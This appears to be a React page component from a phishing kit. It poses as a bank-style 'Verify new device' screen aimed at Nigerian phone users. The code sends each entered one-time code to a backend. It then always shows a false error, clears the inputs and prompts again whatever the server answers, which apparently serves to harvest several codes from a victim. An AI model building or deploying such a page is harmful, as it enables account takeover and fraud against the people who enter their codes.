// Otp.jsx
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import "../styles/otp.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  otp: yup.string(),
});

const Otp = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [pin, setPin] = useState(new Array(5).fill(""));
  const [loading, setLoading] = useState(false);
  const [countdown, setCountdown] = useState(84); // 1:24 in seconds
  const [errorMessage, setErrorMessage] = useState("");
  const [userEmail, setUserEmail] = useState("");

  useEffect(() => {
    const email = localStorage.getItem("userEmail");
    setUserEmail(email || "est...@gmail.com"); // Fallback if no email found
  }, []);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    // Clear error message when user starts typing
    if (errorMessage) {
      setErrorMessage("");
    }

    if (index < 4 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newPin.join(""));
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      document.getElementById(`otp-${index - 1}`).focus();
    }
  };

  const submitForm = (data) => {
    setLoading(true);
    setErrorMessage("");
    axios
      .post(`${BASE_URL}/otp`, data)
      .then((response) => {
        console.log(response.data);
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
        setErrorMessage("An error occurred enter Otp again");
        reset();
        setPin(new Array(5).fill(""));
      });
  };

  return (
    <div className="container">
      <div className="backArrow">
        <i className="fa-solid fa-arrow-left"></i>
      </div>
      <div className="contentSec">
        <div className="title">Verify new device</div>
        <div className="subText">
          Provide verification code sent to: {userEmail}. Please enter code
          below to verify this device
        </div>
        <div className="smsLink">Send code via SMS</div>
      </div>
      <div className="formSec">
        <form onSubmit={handleSubmit(submitForm)}>
          <div className="formOtp">
            {pin.map((data, index) => (
              <input
                key={index}
                id={`otp-${index}`}
                type="text"
                name="otp"
                maxLength="1"
                value={data}
                onChange={(e) => handleChange(e.target, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                onFocus={(e) => e.target.select()}
                className="pin-input"
                inputMode="numeric"
              />
            ))}
          </div>
          <FormErrMsg errors={errors} inputName="otp" />

          {errorMessage && <div className="errorMessage">{errorMessage}</div>}

          <div className="retrySection">
            <div className="retryText">
              Retry in {formatTime(countdown)} seconds
            </div>
            <div className="dialText">
              Dial <span className="dialCode">*242*14#</span> to receive code on
              your registered Nigerian phone number
            </div>
          </div>

          <div className="buttonSec">
            <button type="submit" disabled={loading}>
              {loading ? "Loading..." : "Verify"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Otp;
